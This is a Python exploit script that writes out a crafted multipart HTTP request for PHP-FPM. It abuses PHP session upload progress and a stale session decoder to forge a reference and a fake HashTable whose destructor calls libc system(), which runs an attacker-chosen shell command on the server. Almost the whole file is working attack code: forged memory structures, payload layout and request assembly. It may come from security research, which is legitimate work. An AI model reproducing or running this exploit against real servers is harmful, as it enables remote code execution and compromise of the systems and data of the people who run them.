#!/usr/bin/env python3
"""HTTP-only delivery for the FPM orphan chain.

The B request is a single multipart POST:

    PHPSESSID=<sid>
    PHP_SESSION_UPLOAD_PROGRESS=<CTL>     (binary, ~65 KB)
    f (file part, filename "a")

At FILE_START the upload-progress callback stores the progress array under the
session key ``upload_progress_ + CTL`` and flushes it.  Because the key is
written raw before the session delimiter, the file now starts with

    upload_progress_X|R:101;<filler><fake struct>|<serialized progress>

The next php_session_initialize() (FILE_END / END cleanup) re-reads the file
with the stale decoder left by request A.  The first pair value ``R:101``
resolves through the forged var_entries.data[100] to the fake reference.
The following initialize() destroys the previous session array
(php_session_track_init), which releases the forged reference and lands in the
fake HashTable destructor.

Fake HashTable tuning for the flush that happens between the two:
  nNumUsed       = 1  -> destructor loop visits the bucket
  nNumOfElements = 0  -> serializer emits a:0:{} and never reads arData
  flags          = HASH_FLAG_STATIC_KEYS
  arData         = command string; pDestructor = libc system

The destroy path with nNumUsed != nNumOfElements checks
Z_TYPE(p->val) != IS_UNDEF, so the first byte at CMD+8 (part of the command)
just has to be non-zero.
"""
from __future__ import annotations

import argparse
import struct
import time

IS_REFERENCE_EX = 10 | (1 << 8)          # 0x10a
IS_ARRAY_EX = 7 | (1 << 8)               # 0x107

BOUNDARY = b"----f2shttp00000000"
PREFIX = b"upload_progress_"


def q(buf: bytearray, off: int, val: int) -> None:
    struct.pack_into("<Q", buf, off, val & 0xFFFFFFFFFFFFFFFF)


def d32(buf: bytearray, off: int, val: int) -> None:
    struct.pack_into("<I", buf, off, val & 0xFFFFFFFF)


def make_ctl(d: int, system_addr: int, ctl_len: int, struct_file_off: int,
             cmd: bytes) -> bytes:
    """CTL bytes: X|R:101; filler <fake struct at key offset K> filler."""
    K = struct_file_off - len(PREFIX)
    if K < 10:
        raise SystemExit("struct file offset too small")
    ctl = bytearray(b"A" * ctl_len)
    ctl[0:1] = b"X"
    ctl[1:2] = b"|"
    ctl[2:10] = b"R:101;"

    V = d + 0x2100
    R = d + 0x2180
    S = d + 0x2200
    CMD = d + 0x2300

    # forged php_unserialize_data at D (var_entries at offset 56):
    #   used_slots = 1018 forces var_push to allocate a fresh block, leaving
    #   the inline entries.data[100] (written below) untouched.
    st = bytearray(8216)
    q(st, 0, d + 56)              # last = &entries
    q(st, 56, 1018)               # entries.used_slots
    q(st, 64, 0)                  # entries.next
    q(st, 72 + 8 * 100, V)        # entries.data[100] -> fake zval

    def put(addr: int, data: bytes) -> None:
        off = K + (addr - d)
        if off < 0 or off + len(data) > ctl_len:
            raise SystemExit("structure %#x outside CTL" % addr)
        ctl[off:off + len(data)] = data

    put(d, bytes(st))

    # fake zval at V: IS_REFERENCE -> R
    zv = bytearray(16)
    q(zv, 0, R)
    d32(zv, 8, IS_REFERENCE_EX)
    put(V, bytes(zv))

    # fake zend_reference at R: rc=0 (ZVAL_COPY makes it 1), val = fake array
    ref = bytearray(32)
    d32(ref, 0, 0)
    d32(ref, 4, 10)               # gc.type_info = IS_REFERENCE
    q(ref, 8, S)
    d32(ref, 16, IS_ARRAY_EX)
    q(ref, 24, 0)                 # sources = 0
    put(R, bytes(ref))

    # fake HashTable at S
    ht = bytearray(0x38)
    d32(ht, 0x00, 1)              # gc.refcount = 1
    d32(ht, 0x04, 7)              # gc.type_info = IS_ARRAY
    d32(ht, 0x08, 0x10)           # flags = HASH_FLAG_STATIC_KEYS
    d32(ht, 0x0C, 0xFFFFFFF8)     # nTableMask
    q(ht, 0x10, CMD)              # arData = command
    d32(ht, 0x18, 1)              # nNumUsed = 1
    d32(ht, 0x1C, 0)              # nNumOfElements = 0 (serializer-safe)
    d32(ht, 0x20, 8)              # nTableSize
    d32(ht, 0x24, 0)
    q(ht, 0x28, 0)                # nNextFreeElement
    q(ht, 0x30, system_addr)      # pDestructor = system
    put(S, bytes(ht))

    put(CMD, cmd + b"\x00")

    # The session decoder scans for the next '|' from after R:101; up to the
    # encoder-appended delimiter.  A '|' in the filler would desync the record.
    if b"|" in bytes(ctl[2:]):
        raise SystemExit("0x7c byte inside CTL payload (after injection)")
    return bytes(ctl)


def progress_bytes(cl: int, bp: int, filename: bytes, now: int, files: int = 1) -> bytes:
    """Serialized upload-progress array as written at FILE_START."""
    file_entry = (
        b's:10:"field_name";s:1:"f";'
        b's:4:"name";s:%d:"%s";' % (len(filename), filename) +
        b's:8:"tmp_name";N;'
        b's:5:"error";i:0;'
        b's:4:"done";b:0;'
        b's:10:"start_time";i:%d;'
        b's:15:"bytes_processed";i:%d;' % (now, bp)
    )
    entry = b'a:7:{' + file_entry + b'}'
    files_arr = b'a:%d:{i:0;%s}' % (files, entry)
    return (
        b'a:5:{'
        b's:10:"start_time";i:%d;' % now +
        b's:14:"content_length";i:%d;' % cl +
        b's:15:"bytes_processed";i:%d;' % bp +
        b's:4:"done";b:0;'
        b's:5:"files";' + files_arr +
        b'}'
    )


def part_header(name: bytes, filename: bytes | None = None) -> bytes:
    h = b"--" + BOUNDARY + b"\r\nContent-Disposition: form-data; name=\"" + name + b"\""
    if filename is not None:
        h += b"; filename=\"" + filename + b"\""
    return h + b"\r\n"


def build_body(sid: bytes, ctl: bytes, filename: bytes, content: bytes) -> tuple[bytes, int, int]:
    h1 = part_header(b"PHPSESSID") + b"\r\n" + sid + b"\r\n"
    h2 = part_header(b"PHP_SESSION_UPLOAD_PROGRESS") + b"\r\n"
    fh = part_header(b"f", filename) + b"Content-Type: application/octet-stream\r\n\r\n"
    body = h1 + h2 + ctl + b"\r\n" + fh + content + b"\r\n--" + BOUNDARY + b"--\r\n"
    bp = len(h1) + len(h2) + len(ctl) + 2 + len(fh)
    return body, bp, len(body)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--d", required=True, type=lambda x: int(x, 0))
    ap.add_argument("--system", required=True, type=lambda x: int(x, 0))
    ap.add_argument("--ctl-len", type=int, default=65300)
    ap.add_argument("--struct-off", type=lambda x: int(x, 0), default=0x1FE8)
    ap.add_argument("--sid", default="f2shttp0000000000000000000001")
    ap.add_argument("--cmd", default="id>/tmp/f2s_pwn")
    ap.add_argument("--filename", default="a")
    ap.add_argument("--content-len", type=int, default=0)
    ap.add_argument("--out", required=True)
    args = ap.parse_args()

    filename = args.filename.encode()
    cmd = args.cmd.encode()
    content = b"Z" * args.content_len

    # Progress length only depends on digit widths; iterate to a stable body.
    ctl = make_ctl(args.d, args.system, args.ctl_len, args.struct_off, cmd)
    body, bp, cl = build_body(args.sid.encode(), ctl, filename, content)
    now = int(time.time())
    prog = progress_bytes(cl, bp, filename, now)
    f1_len = len(PREFIX) + len(ctl) + 1 + len(prog)
    print("ctl=%d cl=%d bp=%d prog=%d F1_len=%d (alloc~%d) struct_file_off=%#x K=%#x"
          % (len(ctl), cl, bp, len(prog), f1_len, f1_len + 25, args.struct_off,
             args.struct_off - len(PREFIX)))
    print("V=%#x R=%#x S=%#x CMD=%#x system=%#x" %
          (args.d + 0x2100, args.d + 0x2180, args.d + 0x2200, args.d + 0x2300,
           args.system))
    with open(args.out, "wb") as fh:
        fh.write(body)
    with open(args.out + ".ctl", "wb") as fh:
        fh.write(ctl)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
